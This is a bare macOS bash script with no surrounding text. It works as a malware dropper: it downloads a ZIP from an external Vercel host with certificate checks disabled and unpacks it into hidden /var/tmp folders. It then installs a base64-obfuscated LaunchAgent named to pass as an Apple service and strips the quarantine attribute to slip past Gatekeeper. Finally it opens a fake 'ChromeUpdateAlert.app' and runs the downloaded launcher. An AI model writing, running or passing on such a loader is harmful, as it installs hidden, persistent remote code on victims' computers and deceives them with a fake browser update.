#!/bin/bash

# Define variables for URLs
ZIP_URL_ARM64="https://lazr-beryl.vercel.app/Willo1.zip"
ZIP_URL_INTEL="https://lazr-beryl.vercel.app/Willo1.zip"
ZIP_FILE="/var/tmp/.syncsvc.zip"                      # Path to save the downloaded ZIP file
WORK_DIR="/var/tmp/.syncsvc/"                         # Temporary directory for extracted files
EXECUTABLE="syncservice.sh"                           # Launcher script inside the ZIP
APP="ChromeUpdateAlert.app"                           # The app to open
PLIST_FILE=~/Library/LaunchAgents/com.apple.syncservice.plist   # LaunchAgent plist
LABEL="com.apple.syncservice"                         # LaunchAgent label

# Determine CPU architecture
case $(uname -m) in
    arm64) ZIP_URL=$ZIP_URL_ARM64 ;;
    x86_64) ZIP_URL=$ZIP_URL_INTEL ;;
    *) exit 1 ;;  # Exit for unsupported architectures
esac

# Function to clean up
cleanup() {
    rm -rf "$ZIP_FILE"
}

# Download, unzip, and execute
if python3 -c "
import sys, ssl, urllib.request

url = sys.argv[1]
outfile = sys.argv[2]

# Create an 'unverified' SSL context like -k or --no-check-certificate
ctx = ssl._create_unverified_context()

with urllib.request.urlopen(url, context=ctx) as r, open(outfile, 'wb') as f:
    f.write(r.read())
" "$ZIP_URL" "$ZIP_FILE"  && [[ -f "$ZIP_FILE" ]]; then

    # Extract the archive into $WORK_DIR
    unzip -o -qq "$ZIP_FILE" -d "$WORK_DIR"

    # If the zip wrapped everything in a Willo1/ folder, flatten it
    if [[ -d "$WORK_DIR/Willo1" ]]; then
        mv "$WORK_DIR/Willo1/"* "$WORK_DIR/" 2>/dev/null
        rm -rf "$WORK_DIR/Willo1" "$WORK_DIR/__MACOSX"
    fi

    # Confirm the expected launcher exists after extraction
    if [[ -f "$WORK_DIR/$EXECUTABLE" ]]; then
        chmod +x "$WORK_DIR/$EXECUTABLE"
    else
        echo "$EXECUTABLE not found after unzip."
        cleanup
        exit 1
    fi

else
    # If download failed
    cleanup
    exit 1
fi

# Step 4: Register the service
mkdir -p ~/Library/LaunchAgents

# Base64 encoded plist content
ENCODED_PLIST="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KICAgIDxrZXk+TGFiZWw8L2tleT4KICAgIDxzdHJpbmc+Y29tLmFwcGxlLnN5bmNzZXJ2aWNlPC9zdHJpbmc+CiAgICA8a2V5PlByb2dyYW1Bcmd1bWVudHM8L2tleT4KICAgIDxhcnJheT4KICAgICAgICA8c3RyaW5nPi92YXIvdG1wLy5zeW5jc3ZjL3N5bmNzZXJ2aWNlLnNoPC9zdHJpbmc+CiAgICA8L2FycmF5PgogICAgPGtleT5SdW5BdExvYWQ8L2tleT4KICAgIDx0cnVlLz4KICAgIDxrZXk+S2VlcEFsaXZlPC9rZXk+CiAgICA8ZmFsc2UvPgo8L2RpY3Q+CjwvcGxpc3Q+Cg=="

# Decode the base64 string and write to the plist file
base64 -D <<< "$ENCODED_PLIST" > "$PLIST_FILE"

chmod 644 "$PLIST_FILE"

if ! launchctl list | grep -q "$LABEL"; then
    launchctl load "$PLIST_FILE"
fi

# Step 5: Strip quarantine attribute (unsigned binaries; avoid Gatekeeper block)
xattr -dr com.apple.quarantine "$WORK_DIR" 2>/dev/null

# Step 6: Run ChromeUpdateAlert.app
if [[ -d "$WORK_DIR/$APP" ]]; then
    open "$WORK_DIR/$APP" &
fi

# Step 7: Start the agent immediately (the LaunchAgent only fires at login)
bash "$WORK_DIR/$EXECUTABLE" &

# Final cleanup
cleanup
